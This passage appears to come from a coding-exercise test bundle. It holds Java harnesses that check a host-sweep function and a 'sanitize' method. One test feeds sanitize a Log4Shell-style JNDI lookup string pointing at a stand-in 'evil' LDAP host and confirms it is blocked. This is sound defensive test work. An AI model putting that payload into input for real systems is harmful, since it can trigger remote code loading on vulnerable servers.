chable hosts | sweep handles 1000 hosts | sweep empty\n// @ci-only Virtual threads need Java 21+. Judge0 has Java 17, so this runs on JDK 25 in GitHub Actions.\nimport java.util.*;\npublic class Main {\n    public static void main(String[] args) {\n        Ra.tryCp(\"sweep counts reachable hosts\", () -> Ra.eq(\"sweep counts reachable hosts\", Sweep.sweep(List.of(\"a\", \"\", \"c\")), 2));\n        Ra.tryCp(\"sweep handles 1000 hosts\", () -> { var hs = new ArrayList<String>(); for (int i = 0; i < 1000; i++) hs.add(\"h\" + i); Ra.eq(\"sweep handles 1000 hosts\", Sweep.sweep(hs), 1000); });\n        Ra.tryCp(\"sweep empty\", () -> Ra.eq(\"sweep empty\", Sweep.sweep(List.of()), 0));\n    }\n}\n//@@USER@@\n//@@PRELUDE@@\n","jv12":"// @cp sanitize blocks ${jndi: | sanitize passes clean input | Your @Test methods pass\n// @ci-only Pattern-matching switch with when guards needs Java 21+, and JUnit 5 isn't on Judge0. Runs on JDK 25 + JUnit in GitHub Actions.\nimport java.lang.reflect.*;\npublic class Main {\n    public static void main(String[] args) throws Exception {\n        Method san = null;\n        for (Class<?> c : new Class<?>[] { __CLASS_OF:sanitize__.class }) for (Method m : c.getDeclaredMethods()) if (m.getName().equals(\"sanitize\")) san = m;\n        final Method s = san;\n        s.setAccessible(true);\n        Ra.tryCp(\"sanitize blocks ${jndi:\", () -> { String out = String.valueOf(s.invoke(null, \"${jndi:ldap://evil/a}\")); Ra.cp(!out.contains(\"${jndi:\"), \"sanitize blocks ${jndi:\", \"returned \" + out); });\n        Ra.tryCp(\"sanitize passes clean input\", () -> Ra.eq(\"sanitize passes clean input\", String.valueOf(s.invoke(null, \"hello operator\")), \"hello operator\"));\n        Object t = __TEST_CLASS__.class.getDeclaredConstructor().newInstance();\n        int n = 0, failed = 0;\n        for (Method m : t.getClass().getDeclaredMethods()) if (m.isAnnotationPresent(org.junit.jupiter.api.Test.class)) { n++; try { m.setAccessible(true); m.invoke(t);